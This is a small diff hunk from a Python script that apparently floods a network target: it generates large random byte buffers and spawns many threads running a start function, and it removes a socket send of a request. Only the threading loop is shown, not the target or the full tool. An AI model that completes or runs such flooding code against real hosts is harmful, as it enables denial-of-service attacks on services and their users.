@@ -381,6 +381,5 @@ def start():
 
 for x in range(th):
   ll = random._urandom(50000)
-  s.send(str.encode(main_req))
-    thred = threading.Thread(target=start)
-    thred.start()
+  thred = threading.Thread(target=start)
+  thred.start()
